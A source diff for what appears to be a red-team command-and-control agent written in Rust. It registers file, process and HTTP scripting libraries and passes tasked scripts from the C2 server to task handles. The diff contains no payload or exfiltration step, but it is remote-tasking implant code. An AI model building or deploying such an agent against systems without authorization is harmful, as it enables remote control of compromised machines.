@@ -4,6 +4,15 @@ use pb::{c2::ClaimTasksRequest, config::Config};
 use std::time::{Duration, Instant};
 use transport::Transport;
 
+use eldritch_core::register_lib;
+use eldritch_stdlib::{
+    file::std::StdFileLibrary,
+    process::std::StdProcessLibrary,
+    http::std::StdHttpLibrary,
+    regex::std::StdRegexLibrary,
+};
+use crate::eldritch::{ImixReportLibrary, ImixAgentLibrary, ImixAssetsLibrary};
+
 /*
  * Agent contains all relevant logic for managing callbacks to a c2 server.
  * It is responsible for obtaining tasks, executing them, and returning their output.
@@ -19,6 +28,17 @@ impl<T: Transport + 'static> Agent<T> {
      * Initialize an agent using the provided configuration.
      */
     pub fn new(cfg: Config, t: T) -> Result<Self> {
+        // Register Global Libraries (Once)
+        // Note: This might be called multiple times in tests or if Agent is recreated.
+        // register_lib uses global state, duplicates should be harmless (overwrites).
+        register_lib(StdFileLibrary);
+        register_lib(StdProcessLibrary);
+        register_lib(StdHttpLibrary);
+        register_lib(StdRegexLibrary);
+        register_lib(ImixReportLibrary);
+        register_lib(ImixAgentLibrary);
+        register_lib(ImixAssetsLibrary);
+
         Ok(Agent {
             cfg,
             handles: Vec::new(),
@@ -48,8 +68,10 @@ impl<T: Transport + 'static> Agent<T> {
                 }
             };
 
-            let runtime = eldritch::start(task.id, tome).await;
-            self.handles.push(TaskHandle::new(task.id, runtime));
+            // Convert eldritch bytes to string
+            let script = String::from_utf8(tome.eldritch.into()).unwrap_or_default();
+
+            self.handles.push(TaskHandle::new(task.id, script));
 
             #[cfg(debug_assertions)]
             log::info!("spawned task execution for id={}", task.id);
